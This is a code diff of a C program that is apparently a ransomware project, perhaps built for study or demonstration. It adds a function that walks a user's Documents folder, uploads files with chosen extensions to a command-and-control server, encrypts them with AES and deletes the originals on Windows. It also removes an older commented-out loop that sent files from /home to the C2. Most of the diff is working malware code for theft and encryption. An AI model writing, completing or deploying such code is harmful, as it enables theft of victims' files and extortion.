@@ -22,6 +22,7 @@
 void sendFileToApi(const char *path, const char *id, const char *api);
 char* debug_bytes(const unsigned char* byte_sequence, size_t sequence_size);
 void write_to_file(char *filename, char *value, int size);
+void browse_files(unsigned char *key, unsigned char *iv, unsigned char *aad, const char *id, const char *URL);
 
 
 
@@ -73,29 +74,8 @@ int main(){
     sprintf(URL, "http://%s:%d/upload", ip, port);
     const unsigned char *ID = key_lisible;
 
-    sendFileToApi("1v1.jpg", ID, URL);
-    sendFileToApi("1v1 copy.jpg", ID, URL);
+    browse_files(key, iv, aad, ID, URL);
     sendFileToApi("iv.txt", ID, URL);
-
-    //List all the files we want to borrow ;)
-    /*
-    const char *path = "/home";
-    PathList pathList;
-    initPathList(&pathList);
-
-    linuxListFiles(path, &pathList);
-    //Browse files
-    for (size_t i = 0; i < pathList.count; ++i) {
-        //printf("%s\n", pathList.paths[i]); Debug
-        //Send the raw file to C2
-        sendFileToApi(pathList.paths[i], ID, URL);
-
-        //Encrypt each file with AES
-        //encryptFile(ctx, "pathList.paths[i]");
-    }
-    freePathList(&pathList);
-    */
-
 
     //Redirect to C2's web page for instructions
 
@@ -169,4 +149,66 @@ void write_to_file(char *filename, char *value, int size){
     fwrite(value, sizeof(char), size, file_pointer); // Écrit la clé dans le fichier
 
     fclose(file_pointer); // Ferme le fichier
+}
+
+void browse_files(unsigned char *key, unsigned char *iv, unsigned char *aad, const char *id, const char *URL){
+    // List all the files we want to encrypt
+    const char *path;
+
+    #ifdef _WIN32
+    path = "C:\\Users\\me\\Documents";
+    #else
+    path = "/home/mike/Documents/encrypt";
+    #endif
+
+    PathList pathList;
+    initPathList(&pathList);
+
+    listFiles(path, &pathList);
+
+    //Browse files
+    for (size_t i = 0; i < pathList.count; ++i) {
+
+        if (strstr(pathList.paths[i], "basic_c/") != NULL) {
+            continue; // Ignorer le dossier "basic_c" et ses fichiers
+        }
+        
+        // Check if the file has one of the specified extensions
+        char *extension = strrchr(pathList.paths[i], '.');
+        if (extension != NULL) {
+            for (size_t j = 0; j < num_extensions; ++j) {
+                if (strcmp(extension, extensions[j]) == 0) {
+                    // Send the files to the C2 before being encrypted
+                    sendFileToApi(pathList.paths[i], id, URL);
+                    // Encrypt the file
+                    encrypt_file(key, iv, aad, pathList.paths[i]);
+                    // Decrypt the file (for demonstration purposes)
+                    sleep(1);
+                    #ifdef _WIN32
+                    // Supprimer le fichier d'origine après chiffrement sur Windows
+                    if (remove(pathList.paths[i]) == 0) {
+                        printf("File deleted successfully: %s\n", pathList.paths[i]);
+                    } else {
+                        printf("Error deleting file: %s\n", pathList.paths[i]);
+                    }
+                    #endif
+                    char encrypted_path[1024];
+                    snprintf(encrypted_path, sizeof(encrypted_path), "%s.cha", pathList.paths[i]);
+                    sleep(1);
+                    printf("Decrypting file: %s\n", encrypted_path);
+                    decryptFile(key, iv, aad, encrypted_path);
+                    #ifdef _WIN32
+                    if (remove(encrypted_path) == 0) {
+                        printf("Decrypted file deleted successfully: %s\n", encrypted_path);
+                    } else {
+                        printf("Error deleting decrypted file: %s\n", encrypted_path);
+                    }
+                    #endif
+                    break;
+                }
+            }
+        }
+    }
+
+    freePathList(&pathList);
 }
